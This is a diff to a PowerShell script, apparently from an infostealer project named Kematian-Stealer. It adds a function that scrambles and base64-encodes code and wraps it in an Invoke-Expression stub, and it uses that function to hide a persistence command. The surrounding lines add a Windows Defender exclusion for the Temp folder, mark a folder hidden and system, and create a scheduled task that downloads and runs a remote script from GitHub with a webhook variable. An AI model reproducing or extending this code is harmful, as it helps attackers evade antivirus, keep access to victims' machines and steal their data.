@@ -70,6 +70,25 @@ function CHECK_AND_PATCH {
     return $kematiancheck
 }
 
+function Base64-Obfuscator {
+    # Author: Mr.Un1k0d3r RingZer0 Team
+    [CmdletBinding()]
+    Param (
+		[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+		[string]$Data
+	)
+	
+	
+	PROCESS {
+		$Seed = Get-Random
+		$MixedBase64 = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes($Data) | Sort-Object { Get-Random -SetSeed $Seed }))
+
+		$Var1 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
+		$Var2 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
+		
+		return "`$$($Var1) = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes(`'$($MixedBase64)') | Sort-Object { Get-Random -SetSeed $($Seed) })); `$$($Var2) = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(`$$($Var1))); IEX `$$($Var2)"
+	}
+}
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
@@ -80,6 +99,9 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "WOLVES"
 	$powershellcode = "`$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex"
+        $powershellcodee = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($powershellcode))
+	$powershellcode = Base64-Obfuscator -Data $powershellcodee
+	
         $task_action = if ($debug) {
             New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"$powershellcode`""
         }
